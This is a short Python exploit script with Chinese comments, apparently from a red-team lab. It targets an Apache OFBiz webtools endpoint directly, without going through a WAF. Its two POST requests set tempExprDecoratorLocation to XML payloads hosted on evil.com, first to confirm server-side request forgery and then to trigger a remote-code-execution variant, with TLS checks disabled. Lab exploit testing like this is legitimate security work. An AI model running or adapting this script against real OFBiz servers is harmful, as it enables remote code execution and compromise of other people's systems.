# -*- coding: utf-8 -*-
"""RT-2 步骤2：直连对照（one-off 容器内跑，https://ofbiz:8443 不过 WAF）。

仅用于对照确认漏洞仍在；不作攻击通道。
用法: docker run --rm -v <lab>:/w --network multi-round-lab_ofbiz python:3-alpine python /w/exp/ofbiz/rt2_direct_ctl.py
"""
import ssl
import urllib.request
import urllib.parse

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

body = urllib.parse.urlencode({
    "tempExprDecoratorLocation": "http://evil.com:8000/payloads/ofbiz_rt2_ctl.xml",
}).encode()

req = urllib.request.Request(
    "https://ofbiz:8443/webtools/control/main/findTemporalExpression",
    data=body, headers={"User-Agent": "Mozilla/5.0"})
try:
    with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
        print("direct-ctl -> HTTP", resp.status, len(resp.read()))
except Exception as e:
    print("direct-ctl EXC:", e)

# 另打一发 SSRF 标记（确认直连时 SSRF 通路），并触发同名载荷的 RCE 版
body2 = urllib.parse.urlencode({
    "tempExprDecoratorLocation": "http://evil.com:8000/payloads/ofbiz_rt2_direct.xml",
}).encode()
req2 = urllib.request.Request(
    "https://ofbiz:8443/webtools/control/main/findTemporalExpression",
    data=body2, headers={"User-Agent": "Mozilla/5.0"})
try:
    with urllib.request.urlopen(req2, context=ctx, timeout=30) as resp:
        print("direct-ctl2 -> HTTP", resp.status, len(resp.read()))
except Exception as e:
    print("direct-ctl2 EXC:", e)
